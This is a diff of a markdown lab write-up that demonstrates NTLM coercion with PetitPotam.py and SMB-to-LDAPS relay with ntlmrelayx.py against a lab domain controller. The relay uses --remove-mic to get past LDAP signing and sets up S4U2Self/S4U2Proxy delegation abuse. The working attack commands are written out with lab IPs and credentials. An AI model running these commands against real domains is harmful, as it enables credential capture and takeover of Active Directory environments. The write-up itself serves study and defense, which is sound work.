@@ -195,11 +195,17 @@ And we launch `PetitPotam.py`:
 svim @Burned in PetitPotam on  main ? ❯ python3 PetitPotam.py -dc-ip '192.168.20.52' -u 's.vim' -p 'snake123' 192.168.20.68 192.168.20.52 2>/dev/null
 ```
 And if we look at `Responder`:
+
 ![Responder NTLMv1 Capture](images/responder-ntlmv1-capture.png)
+
 We captured the `NTLMv1` hash of `DC01$`, interesting. But what happens if we disable `NTLMv1` support on the `DC`?
+
 ![NTLMv1 Policy](images/ntlmv1-policy.png)
+
 We launch `PetitPotam.py` again:
+
 ![Responder NTLMv2 Capture](images/responder-ntlmv2-capture.png)
+
 We are still capturing `NTLMv2`.
 - We just confirmed that even with `SMB / LDAP Signing` enabled we can still capture `NTLMv2` (the first step of `ntlmrelayx.py`).
 
@@ -305,19 +311,29 @@ Access to DAN-MACHINE$ as Administrator
 ```
 ## Lab 2
 For this `Lab` I already have `DAN-MACHINE$` created and added to the `Domain Admins` group. Let's imagine we found that account vulnerable to Coercion and it is a member of this group.
+
 ![DAN-MACHINE Domain Admins](images/dan-machine-domain-admins.png)
+
 And we will set the GPO `Network Security: LAN Manager authentication level` to `Not Defined (Default)`.
+
 ![LAN Manager Auth Level Policy](images/lm-auth-level-policy.png)
+
 Let's start the full attack (remember that SMB / LDAP Signing are ON).
+
 - If we launch `PetitPotam.py`:
+
 ![PetitPotam No Relay](images/ntlmrelayx-smb-signing-fail.png)
+
 We can see that `ntlmrelayx` could not relay to `LDAP`. This is because of what we saw earlier, `SMB / LDAP Signing` is being negotiated. Let's use `--remove-mic`.
+
 ![LDAP Signing Error](./images/ldap-signing-error.png)
+
 We get a `'LDAP Signing is enabled'` error, and this is where the second bypass comes in. Let's try bypassing `LDAP Signing` via `LDAPS`:
 ```cpp
 svim @Burned in burned/exploits/poc ❯ sudo ntlmrelayx.py -t 'ldaps://192.168.20.52' --no-dump --delegate-access -smb2support --remove-mic
 ```
 ![ntlmrelayx LDAPS Success](images/ntlmrelayx-ldaps-success.png)
+
 And we have a successful `SMB->LDAPS` relay. This is where the `S4U2Self & S4U2Proxy` attack begins.
 
 Normally a `Machine Account` will have a `SPN` of type `HOST`, so we are going to request a TGS via `S4U2Proxy` for `HOST/DAN-MACHINE.BURNED.CORP`
